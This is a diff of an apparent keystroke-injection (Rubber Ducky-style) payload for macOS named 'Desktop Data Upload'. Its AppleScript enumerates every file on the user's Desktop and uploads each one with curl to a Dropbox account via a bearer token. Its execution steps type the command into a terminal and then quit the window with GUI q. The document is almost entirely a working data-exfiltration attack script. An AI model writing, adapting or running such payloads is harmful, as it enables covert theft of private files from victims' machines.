@@ -5,21 +5,31 @@ REM Title: Desktop Data Upload
 REM Version 1.0 MacOs
 
 REM Copy and paste this osascript/code into the Script editor App on your MacOs
-REM Replace the "Your API token Here" placeholder with your actual Dropbox API token
+REM Replace the "Your API Access token Here" placeholder with your actual Dropbox API token. line 13
 REM Save this script below as DTDUpload.scpt file (you can use Script Editor) to your desktop.
 
 
-osascript -e 'tell application "Script Editor"
-    set desktopPath to POSIX path of (path to desktop folder)
-    set dropboxAPIPath to "Your API token Here"
-    set apiEndpointURL to "https://api.dropboxapi.com/2/files/upload"
-    set uploadScript to "curl -X POST \"" & apiEndpointURL & "\" " & ¬
-        "-H \"Authorization: Bearer " & dropboxAPIPath & "\" " & ¬
-        "-H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/Desktop/$(basename " & desktopPath & "), \\\"mode\\\": \\\"overwrite\\\"}\" " & ¬
-        "-H \"Content-Type: application/octet-stream\" " & ¬
-        "-d @\"" & desktopPath & "\""
-    do shell script uploadScript
-end tell'
+set desktopPath to POSIX path of (path to desktop folder)
+set dropboxAPIPath to "Your API Access token Here"
+set apiEndpointURL to "https://content.dropboxapi.com/2/files/upload"
+
+-- Get a list of files on the desktop
+set fileNames to paragraphs of (do shell script "find " & quoted form of desktopPath & " -type f -maxdepth 1 -exec basename {} \\;")
+
+-- Iterate over each file and upload it individually
+repeat with fileName in fileNames
+	set filePath to desktopPath & fileName
+	-- Construct the cURL command to upload the file
+	set uploadScript to "curl -X POST " & quoted form of apiEndpointURL & " " & ¬
+		"-H \"Authorization: Bearer " & dropboxAPIPath & "\" " & ¬
+		"-H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/" & fileName & "\\\", \\\"mode\\\": \\\"add\\\", \\\"autorename\\\": true, \\\"mute\\\": false}\" " & ¬
+		"-H \"Content-Type: text/plain; charset=dropbox-cors-hack\" " & ¬
+		"-T " & quoted form of (POSIX path of filePath)
+	
+	-- Run the cURL command
+	do shell script uploadScript
+end repeat
+
 
 REM Title: Desktop Data Upload Execution Script 
 REM Version 1.0 MacOs
@@ -40,6 +50,8 @@ ENTER
 DELAY 500
 STRING osascript DTDUpload.scpt
 ENTER
+DELAY 4000
+GUI q
 
 
 
